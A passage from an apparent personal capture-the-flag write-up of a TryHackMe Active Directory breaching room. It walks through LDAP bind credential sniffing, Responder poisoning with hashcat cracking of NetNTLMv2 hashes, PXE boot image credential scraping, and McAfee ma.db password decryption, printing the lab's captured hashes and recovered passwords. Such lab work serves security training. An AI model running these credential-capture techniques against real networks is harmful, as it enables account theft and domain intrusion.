 0x0000: 4500 0036 93f5 4000 4006 5cd5 0a32 1935 E..6..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e2b0 9778 067b ........OO...x.{
 0x0020: 5018 01f6 73d2 0000 300c 0201 0865 070a P...s...0....e..
 0x0030: 0100 0400 0400 ......
14:31:53.120302 IP 10.200.27.201.54281 > kali.ldap: Flags [.], ack 1330635454, win 1026, length 0
 0x0000: 4500 0028 9407 4000 7f06 1dd1 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d409 0185 9778 067b 4f4f e2be .2.5.....x.{OO..
 0x0020: 5010 0402 bc4a 0000 P....J..
14:31:53.120324 IP 10.200.27.201.54281 > kali.ldap: Flags [P.], seq 2541225595:2541225669, ack 1330635454, win 1026, length 74
 0x0000: 4500 0072 9408 4000 7f06 1d86 0ac8 1bc9 E..r..@.........
 0x0010: 0a32 1935 d409 0185 9778 067b 4f4f e2be .2.5.....x.{OO..
 0x0020: 5018 0402 72bd 0000 3084 0000 0044 0201 P...r...0....D..
 0x0030: 0963 8400 0000 3b04 000a 0100 0a01 0002 .c....;.........
 0x0040: 0100 0201 7801 0100 870b 6f62 6a65 6374 ....x.....object
 0x0050: 636c 6173 7330 8400 0000 1704 1573 7570 class0.......sup
 0x0060: 706f 7274 6564 4361 7061 6269 6c69 7469 portedCapabiliti
 0x0070: 6573 es
14:31:53.120522 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635454:1330635465, ack 2541225669, win 502, length 11
 0x0000: 4500 0033 93f6 4000 4006 5cd7 0a32 1935 E..3..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e2be 9778 06c5 ........OO...x..
 0x0020: 5018 01f6 7e57 0000 3009 0201 0964 0404 P...~W..0....d..
 0x0030: 0030 00 .0.
14:31:53.120546 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635465:1330635479, ack 2541225669, win 502, length 14
 0x0000: 4500 0036 93f7 4000 4006 5cd3 0a32 1935 E..6..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e2c9 9778 06c5 ........OO...x..
 0x0020: 5018 01f6 726f 0000 300c 0201 0965 070a P...ro..0....e..
 0x0030: 0100 0400 0400 ......
14:31:53.313191 IP 10.200.27.201.54281 > kali.ldap: Flags [.], ack 1330635479, win 1026, length 0
 0x0000: 4500 0028 9409 4000 7f06 1dcf 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d409 0185 9778 06c5 4f4f e2d7 .2.5.....x..OO..
 0x0020: 5010 0402 bbe7 0000 P.......
14:31:53.313214 IP 10.200.27.201.54281 > kali.ldap: Flags [P.], seq 2541225669:2541225735, ack 1330635479, win 1026, length 66
 0x0000: 4500 006a 940a 4000 7f06 1d8c 0ac8 1bc9 E..j..@.........
 0x0010: 0a32 1935 d409 0185 9778 06c5 4f4f e2d7 .2.5.....x..OO..
 0x0020: 5018 0402 e13a 0000 3084 0000 003c 0201 P....:..0....<..
 0x0030: 0a60 8400 0000 3302 0103 0404 4e54 4c4d .`....3.....NTLM
 0x0040: 8a28 4e54 4c4d 5353 5000 0100 0000 0782 .(NTLMSSP.......
 0x0050: 08a2 0000 0000 0000 0000 0000 0000 0000 ................
 0x0060: 0000 0a00 6345 0000 000f ....cE....
14:31:53.313431 IP kali.ldap > 10.200.27.201.54281: Flags [P.], seq 1330635479:1330635503, ack 2541225735, win 502, length 24
 0x0000: 4500 0040 93f8 4000 4006 5cc8 0a32 1935 E..@..@.@.\..2.5
 0x0010: 0ac8 1bc9 0185 d409 4f4f e2d7 9778 0707 ........OO...x..
 0x0020: 5018 01f6 723b 0000 3016 0201 0a61 110a P...r;..0....a..
 0x0030: 0122 0400 040a 696e 7661 6c69 6420 444e ."....invalid.DN
14:31:53.505054 IP 10.200.27.201.54282 > kali.ldap: Flags [SEW], seq 3873694998, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
 0x0000: 4502 0034 940b 4000 7f06 1dbf 0ac8 1bc9 E..4..@.........
 0x0010: 0a32 1935 d40a 0185 e6e3 e516 0000 0000 .2.5............
 0x0020: 80c2 faf0 8888 0000 0204 0509 0103 0308 ................
 0x0030: 0101 0402 ....
14:31:53.505072 IP kali.ldap > 10.200.27.201.54282: Flags [S.], seq 3054909857, ack 3873694999, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
 0x0000: 4500 0034 0000 4000 4006 f0cc 0a32 1935 E..4..@.@....2.5
 0x0010: 0ac8 1bc9 0185 d40a b616 39a1 e6e3 e517 ..........9.....
 0x0020: 8012 faf0 98d5 0000 0204 05b4 0101 0402 ................
 0x0030: 0103 0307 ....
14:31:53.557363 IP 10.200.27.201.54281 > kali.ldap: Flags [.], ack 1330635503, win 1026, length 0
 0x0000: 4500 0028 940c 4000 7f06 1dcc 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d409 0185 9778 0707 4f4f e2ef .2.5.....x..OO..
 0x0020: 5010 0402 bb8d 0000 P.......
14:31:53.695909 IP 10.200.27.201.54282 > kali.ldap: Flags [.], ack 3054909858, win 1027, length 0
 0x0000: 4500 0028 940d 4000 7f06 1dcb 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d40a 0185 e6e3 e517 b616 39a2 .2.5..........9.
 0x0020: 5010 0403 d095 0000 P.......
14:31:53.696052 IP 10.200.27.201.54282 > kali.ldap: Flags [P.], seq 3873694999:3873695064, ack 3054909858, win 1027, length 65
 0x0000: 4500 0069 940e 4000 7f06 1d89 0ac8 1bc9 E..i..@.........
 0x0010: 0a32 1935 d40a 0185 e6e3 e517 b616 39a2 .2.5..........9.
 0x0020: 5018 0403 faaf 0000 3084 0000 003b 0201 P.......0....;..
 0x0030: 0b60 8400 0000 3202 0102 0418 7a61 2e74 .`....2.....za.t
 0x0040: 7279 6861 636b 6d65 2e63 6f6d 5c73 7663 ryhackme.com\svc
 0x0050: 4c44 4150 8013 7472 7968 6163 6b6d 656c LDAP..tryhackmel
 0x0060: 6461 7070 6173 7331 40 dappass1@
14:31:53.696060 IP kali.ldap > 10.200.27.201.54282: Flags [.], ack 3873695064, win 502, length 0
 0x0000: 4500 0028 137c 4000 4006 dd5c 0a32 1935 E..(.|@.@..\.2.5
 0x0010: 0ac8 1bc9 0185 d40a b616 39a2 e6e3 e558 ..........9....X
 0x0020: 5010 01f6 d261 0000 P....a..
14:31:53.696374 IP kali.ldap > 10.200.27.201.54282: Flags [P.], seq 3054909858:3054909882, ack 3873695064, win 502, length 24
 0x0000: 4500 0040 137d 4000 4006 dd43 0a32 1935 E..@.}@.@..C.2.5
 0x0010: 0ac8 1bc9 0185 d40a b616 39a2 e6e3 e558 ..........9....X
 0x0020: 5018 01f6 85eb 0000 3016 0201 0b61 110a P.......0....a..
 0x0030: 0122 0400 040a 696e 7661 6c69 6420 444e ."....invalid.DN
14:31:53.932375 IP 10.200.27.201.54282 > kali.ldap: Flags [.], ack 3054909882, win 1027, length 0
 0x0000: 4500 0028 9411 4000 7f06 1dc7 0ac8 1bc9 E..(..@.........
 0x0010: 0a32 1935 d40a 0185 e6e3 e558 b616 39ba .2.5.......X..9.
 0x0020: 5010 0403 d03c 0000 P....<..
```

If we analyze the output, we can find this:

```
 0x0000: 4500 0069 944f 4000 7f06 1d48 0ac8 1bc9 E..i.O@....H....
 0x0010: 0a32 1935 e41e 0185 265c 6e2a e711 3fa8 .2.5....&\n*..?.
 0x0020: 5018 0403 dc0f 0000 3084 0000 003b 0201 P.......0....;..
 0x0030: 1a60 8400 0000 3202 0102 0418 7a61 2e74 .`....2.....za.t
 0x0040: 7279 6861 636b 6d65 2e63 6f6d 5c73 7663 ryhackme.com\svc
 0x0050: 4c44 4150 8013 7472 7968 6163 6b6d 656c LDAP..tryhackmel
 0x0060: 6461 7070 6173 7331 40 dappass1@
```

As seen, we got our password:

```
tryhackmeldappass1@
```

![Pasted image 20250526134159.png](../../../IMAGES/Pasted%20image%2020250526134159.png)

# Authentication Relays

---

Continuing with attacks that can be staged from our rogue device, we will now look at attacks against broader network authentication protocols. In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network. 

These services have to use built-in authentication methods to verify the identity of incoming connections. In Task 2, we explored NTLM Authentication used on a web application. In this task, we will dive a bit deeper to look at how this authentication looks from the network's perspective. However, for this task, we will focus on NetNTLM authentication used by SMB.

## Server Message Block

The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.

However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organizations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:

- Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
- We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

## LLMNR, NBT-NS, and WPAD 

In this task, we will take a bit of a look at the authentication that occurs during the use of SMB. We will use Responder to attempt to intercept the NetNTLM challenge to crack it. There are usually a lot of these challenges flying around on the network. Some security solutions even perform a sweep of entire IP ranges to recover information from hosts. Sometimes due to stale DNS records, these authentication challenges can end up hitting your rogue device instead of the intended host.

Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to. On a real LAN, Responder will attempt to poison any Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.

Since these protocols rely on requests broadcasted on the local network, our rogue device would also receive these requests. Usually, these requests would simply be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

## Intercepting NetNTLM Challenge

One thing to note is that Responder essentially tries to win the race condition by poisoning the connections to ensure that you intercept the connection. This means that Responder is usually limited to poisoning authentication challenges on the local network. Since we are connected via a VPN to the network, we will only be able to poison authentication challenges that occur on this VPN network. For this reason, we have simulated an authentication request that can be poisoned that runs every 30 minutes. This means that you may have to wait a bit before you can intercept the NetNTLM challenge and response.

Although Responder would be able to intercept and poison more authentication requests when executed from our rogue device connected to the LAN of an organization, it is crucial to understand that this behavior can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.

Responder has already been installed on the AttackBox. However, if you are not using the AttackBox, you can download and install it from this repo: [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder). We will set Responder to run on the interface connected to the VPN:

`sudo responder -I breachad` 

If you are using the AttackBox not all of the Responder services will be able to start since other services are already using those ports. However, this will not impact this task. Responder will now listen for any LLMNR, NBT-NS, or WPAD requests that are coming in. We would leave Responder to run for a bit on a real LAN. However, in our case, we have to simulate this poisoning by having one of the servers attempt to authenticate to machines on the VPN. Leave Responder running for a bit (average 10 minutes, get some fresh air!), and you should receive an SMBv2 connection which Responder can use to entice and extract an NTLMv2-SSP response. It will look something like this:

NTLMPassword Spraying Attack

```shell-session
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```

If we were using our rogue device, we would probably run Responder for quite some time, capturing several responses. Once we have a couple, we can start to perform some offline cracking of the responses in the hopes of recovering their associated NTLM passwords. If the accounts have weak passwords configured, we have a good chance of successfully cracking them. Copy the NTLMv2-SSP Hash to a textfile. We will then use the password list provided in the downloadable files for this task and Hashcat in an attempt to crack the hash using the following command:

`hashcat -m 5600 <hash file> <password file> --force`

The password file has been provided for you on the AttackBox in the`/root/Rooms/BreachingAD/task5/` directory or as a downloadable task file. We use hashtype 5600, which corresponds with NTLMv2-SSP for hashcat. If you use your own machine, you will have to install [Hashcat](https://hashcat.net/hashcat/) first. 

Any hashes that we can crack will now provide us with AD credentials for our breach! 

## Relaying the Challenge 

In some instances, however, we can take this a step further by trying to relay the challenge instead of just capturing it directly. This is a little bit more difficult to do without prior knowledge of the accounts since this attack depends on the permissions of the associated account. We need a couple of things to play in our favour:

- SMB Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB signing is enabled, we won't be able to forge the message signature, meaning the server would reject it.
- The associated account needs the relevant permissions on the server to access the requested resources. Ideally, we are looking to relay the challenge and response of an account with administrative privileges over the server, as this would allow us to gain a foothold on the host.
- Since we technically don't yet have an AD foothold, some guesswork is involved into what accounts will have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

This is why blind relays are not usually popular. Ideally, you would first breach AD using another method and then perform enumeration to determine the privileges associated with the account you have compromised. From here, you can usually perform lateral movement for privilege escalation across the domain. However, it is still good to fundamentally under how a relay attack works, as shown in the diagram below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png) 

If you want to try this type of attack in action, head over to the [Holo Network](https://tryhackme.com/jr/hololive). We will also come back to this one in future AD Rooms.


## Practical
---

In order to resolve this task, we need to stop the `slapd` service since this is using our `389` port:

```
sudo lsof -i tcp:389 -s tcp:listen
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
slapd 42649 openldap 7u IPv4 98715 0t0 TCP *:ldap (LISTEN)
slapd 42649 openldap 8u IPv6 98716 0t0 TCP *:ldap (LISTEN)


service slapd stop
```

Now, we can run responder on the `breachad` interface:

```
sudo responder -I breachad
```

We need to leave it here for a while, it should take around 10 minutes, after a while, we get:

```
[SMB] NTLMv2-SSP Client : 10.200.27.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash : svcFileCopy::ZA:2b968c28c0e8f215:9AF58F4A3B1A70D6700063DDE9DCC03C:010100000000000080746EF951CEDB01EA9BEFE2F902C8FA0000000002000800480046005900440001001E00570049004E002D004A004700390037004F00380033004500470033004D0004003400570049004E002D004A004700390037004F00380033004500470033004D002E0048004600590044002E004C004F00430041004C000300140048004600590044002E004C004F00430041004C000500140048004600590044002E004C004F00430041004C000700080080746EF951CEDB010600040002000000080030003000000000000000000000000020000051022B4F873745C7BFA1D22A2E8EE4DFE30D92A8C3C796FDFC877CD2E330DCF60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320035002E00350033000000000000000000
```

![Pasted image 20250526142956.png](../../../IMAGES/Pasted%20image%2020250526142956.png)

Now, we need to crack the hash, let's store it on a file first:

```bash
echo 'svcFileCopy::ZA:2b968c28c0e8f215:9AF58F4A3B1A70D6700063DDE9DCC03C:010100000000000080746EF951CEDB01EA9BEFE2F902C8FA0000000002000800480046005900440001001E00570049004E002D004A004700390037004F00380033004500470033004D0004003400570049004E002D004A004700390037004F00380033004500470033004D002E0048004600590044002E004C004F00430041004C000300140048004600590044002E004C004F00430041004C000500140048004600590044002E004C004F00430041004C000700080080746EF951CEDB010600040002000000080030003000000000000000000000000020000051022B4F873745C7BFA1D22A2E8EE4DFE30D92A8C3C796FDFC877CD2E330DCF60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320035002E00350033000000000000000000' > hash
```

We can now crack it:

```
hashcat -m 5600 hash passwordlist-1647876320267.txt
```

After some short time, we get:

```
SVCFILECOPY::ZA:2b968c28c0e8f215:9af58f4a3b1a70d6700063dde9dcc03c:010100000000000080746ef951cedb01ea9befe2f902c8fa0000000002000800480046005900440001001e00570049004e002d004a004700390037004f00380033004500470033004d0004003400570049004e002d004a004700390037004f00380033004500470033004d002e0048004600590044002e004c004f00430041004c000300140048004600590044002e004c004f00430041004c000500140048004600590044002e004c004f00430041004c000700080080746ef951cedb010600040002000000080030003000000000000000000000000020000051022b4f873745c7bfa1d22a2e8ee4dfe30d92a8c3c796fdfc877cd2e330dcf60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00350030002e00320035002e00350033000000000000000000:FPassword1!
```
![Pasted image 20250526143244.png](../../../IMAGES/Pasted%20image%2020250526143244.png)

We found the password:

```
FPassword1!
```

![Pasted image 20250526143255.png](../../../IMAGES/Pasted%20image%2020250526143255.png)



# Microsoft Deployment Toolkit

---

Large organizations need tools to deploy and manage the infrastructure of the estate. In massive organizations, you can't have your IT personnel using DVDs or even USB Flash drives running around installing software on every single machine. Luckily, Microsoft already provides the tools required to manage the estate. However, we can exploit misconfigurations in these tools to also breach AD. 

## MDT and SCCM 

Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). Large organizations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.

Usually, MDT is integrated with Microsoft's System Center Configuration Manager (SCCM), which manages all updates for all Microsoft applications, services, and operating systems. MDT is used for new deployments. Essentially it allows the IT team to preconfigure and manage boot images. Hence, if they need to configure a new machine, they just need to plug in a network cable, and everything happens automatically. They can make various changes to the boot image, such as already installing default software like Office365 and the organization's anti-virus of choice. It can also ensure that the new build is updated the first time the installation runs.

SCCM can be seen as almost an expansion and the big brother to MDT. What happens to the software after it is installed? Well, SCCM does this type of patch management. It allows the IT team to review available updates to all software installed across the estate. The team can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines. It makes the life of the IT team significantly easier.

However, anything that provides central management of infrastructure such as MDT and SCCM can also be targetted by attackers in an attempt to take over large portions of critical functions in the estate. Although MDT can be configured in various ways, for this task, we will focus exclusively on a configuration called Preboot Execution Environment (PXE) boot.

## PXE Boot 

Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png)

Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:

- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install.

In this task, we will focus on the latter. We will attempt to recover the deployment service account associated with the MDT service during installation for this password scraping attack. Furthermore, there is also the possibility of retrieving other AD accounts used for the unattended installation of applications and services.

### PXE Boot Image Retrieval 

Since DHCP is a bit finicky, we will bypass the initial steps of this attack. We will skip the part where we attempt to request an IP and the PXE boot preconfigure details from DHCP. We will perform the rest of the attack from this step in the process manually.

The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server. In our case, you can recover that information from the TryHackMe network diagram. 

The second piece of information you would have received was the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture. To retrieve this information, you will need to connect to this website: [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com/). It will list various BCD files:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png)

Usually, you would use TFTP to request each of these BCD files and enumerate the configuration for all of them. However, in the interest of time, we will focus on the BCD file of the **x64** architecture. Copy and store the full name of this file. For the rest of this exercise, we will be using this name placeholder`x64{7B...B3}.bcd` since the files and their names are regenerated by MDT every day. Each time you see this placeholder, remember to replace it with your specific BCD filename. **Note as well that if the network has just started, these file names will only update after 10 minutes of the network being active.** 

With this initial information now recovered from DHCP (wink wink), we can enumerate and retrieve the PXE Boot image. We will be using our SSH connection on THMJMP1 for the next couple of steps, so please authenticate to this SSH session using the following:

`ssh thm@THMJMP1.za.tryhackme.com`

and the password of`Password1@`.

To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:

SSHCommand Prompt

```markup
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir <username>
C:\Users\THM\Documents> copy C:\powerpxe <username>\
C:\Users\THM\Documents\> cd <username>
```

The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we can't list files. Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the /Tmp/ directory on the MDT server. We can initiate the TFTP transfer using the following command in our SSH session:

SSHCommand Prompt

```markup
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

You will have to lookup THMMDT IP with`nslookup thmmdt.za.tryhackme.com`. With the BCD file now recovered, we will be using [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read its contents. Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:

SSHCommand Prompt

```markup
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved. 

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:

SSHCommand Prompt

```markup
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```

This download will take a while since you are downloading a fully bootable and configured Windows image. Maybe stretch your legs and grab a glass of water while you wait.

## Recovering Credentials from a PXE Boot Image

Now that we have recovered the PXE Boot image, we can exfiltrate stored credentials. It should be noted that there are various attacks that we could stage. We could inject a local administrator user, so we have admin access as soon as the image boots, we could install the image to have a domain-joined machine. If you are interested in learning more about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.

Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:

SSHCommand Prompt

```markup
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

As you can see, powerpxe was able to recover the AD credentials. We now have another set of AD credentials that we can use!


## Practical

---

Let's begin, we need to connect to ssh first:

```bash
ssh thm@THMJMP1.za.tryhackme.com

Password1@
```


![Pasted image 20250526145243.png](../../../IMAGES/Pasted%20image%2020250526145243.png)

Inside of here, we need to create a working directory for our user:

```powershell
powershell -ep bypass
mkdir user
cd user
cp -Recurse C:\powerpxe .
```

Now, we need to simulate we are a `PXE` client, for this, we need to do:

```powershell
tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET "\Tmp\x64{69D56F60-3A34-444F-A7B5-4901178D2FE0}.bcd" conf.bcd
```

>Note: The name of the `.bcd` file can change, you need to check it by going to `http://pxeboot.za.tryhackme.com/`

![Pasted image 20250526145737.png](../../../IMAGES/Pasted%20image%2020250526145737.png)

![Pasted image 20250526145757.png](../../../IMAGES/Pasted%20image%2020250526145757.png)

As seen, the file successfully downloaded, we now need to analyze the boot image, for this, we need to use `powerpxe`:

```powershell
Import-Module .\powerpxe\PowerPXE.ps1
$bcdfile = "conf.bcd"
Get-WimFile -bcdFile $bcdfile
```


![Pasted image 20250526145924.png](../../../IMAGES/Pasted%20image%2020250526145924.png)

Nice, we now know the path to download the image, we need to do this, it may take a while:

```powershell
$wimfile = '\Boot\x64\Images\LiteTouchPE_x64.wim'
$mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress
tftp -i $mdtserver GEt "$wimfile" pxeboot.wim
```


![Pasted image 20250526150308.png](../../../IMAGES/Pasted%20image%2020250526150308.png)

As seen, it took a while, we now need to retrieve the credentials to finish:

```powershell
Get-FindCredentials -WimFile .\pxeboot.wim

>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@

```

![Pasted image 20250526150415.png](../../../IMAGES/Pasted%20image%2020250526150415.png)

There we go, we got the credentials.

![Pasted image 20250526150453.png](../../../IMAGES/Pasted%20image%2020250526150453.png)


# Configuration Files

---

The last enumeration avenue we will explore in this network is configuration files. Suppose you were lucky enough to cause a breach that gave you access to a host on the organisation's network. In that case, configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration: - Web application config files 
- Service configuration files
- Registry keys
- Centrally deployed applications 

Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.

## Configuration File Credentials 

However, we will focus on recovering credentials from a centrally deployed application in this task. Usually, these applications need a method to authenticate to the domain during both the installation and execution phases. An example of such as application is McAfee Enterprise Endpoint Security, which organisations can use as the endpoint detection and response tool for security. 

McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db. This database file can be retrieved and read with local access to the host to recover the associated AD service account. We will be using the SSH access on THMJMP1 again for this exercise.

The ma.db file is stored in a fixed location: 

SSHCommand Prompt

```shell-session
thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 Volume in drive C is Windows 10
 Volume Serial Number is 6A0F-AA0F

 Directory of C:\ProgramData\McAfee\Agent\DB 

03/05/2022 10:03 AM <DIR> .
03/05/2022 10:03 AM <DIR> ..
03/05/2022 10:03 AM 120,832 ma.db 
 1 File(s) 120,832 bytes 
 2 Dir(s) 39,426,285,568 bytes free
```

We can use SCP to copy the ma.db to our AttackBox:

Terminal

```shell-session
thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@10.200.4.249's password:
ma.db 100% 118KB 144.1KB/s 00:00
```

To read the database file, we will use a tool called sqlitebrowser. We can open the database using the following command:

Terminal

```shell-session
thm@thm:# sqlitebrowser ma.db
```

Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT_REPOSITORIES table:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png) 

We are particularly interested in the second entry focusing on the DOMAIN, AUTH_USER, and AUTH_PASSWD field entries. Make a note of the values stored in these entries. However, the AUTH_PASSWD field is encrypted. Luckily, McAfee encrypts this field with a known key. Therefore, we will use the following old python2 script to decrypt the password. The script has been provided as a downloadable task file or on the AttackBox, it can be found in the`/root/Rooms/BreachingAD/task7/` directory.

**Note: The tool we will use here is quite old. It uses Python v2 and relies on an old crypto library. If you cannot get the script to work on your own VM, please make use of the AttackBox. However, there has been a recent update to the application to ensure that it works on Python3 as well, you can download the latest version here: [https://github.com/funoverip/mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)** 

You will have to unzip the mcafee-sitelist-pwd-decryption.zip file:

```shell-session
thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
```

By providing the script with our base64 encoded and encrypted password, the script will provide the decrypted password:

Terminal

```shell-session
thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
Crypted password : <AUTH PASSWD VALUE>
Decrypted password : <Decrypted Pasword>
```

We now once again have a set of AD credentials that we can use for further enumeration! This is just one example of recovering credentials from configuration files. If you are ever able to gain a foothold on a host, make sure to follow a detailed and refined methodology to ensure that you recover all loot from the host, including credentials and other sensitive information that can be stored in configuration files.


## Practical

---

To start, we need to get the `ma.db` file:

```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
Password1@
```

![Pasted image 20250526152524.png](../../../IMAGES/Pasted%20image%2020250526152524.png)

With the db in our machine, we can do:

```
sqlitebrowser ma.db
```

We will notice this on the `AGENT_REPOSITORIES` table:

![Pasted image 20250526152739.png](../../../IMAGES/Pasted%20image%2020250526152739.png)

We can see the `AUTH_PASSWD` for `svcAV` user, let's copy this value and use our tool (`We can find the tool on the downloadable task files`)

If the provided tool by the room, does not work, we can use this one:

https://github.com/funoverip/mcafee-sitelist-pwd-decryption/blob/master/mcafee_sitelist_pwd_decrypt.py

```
pip3 install pycryptodomex

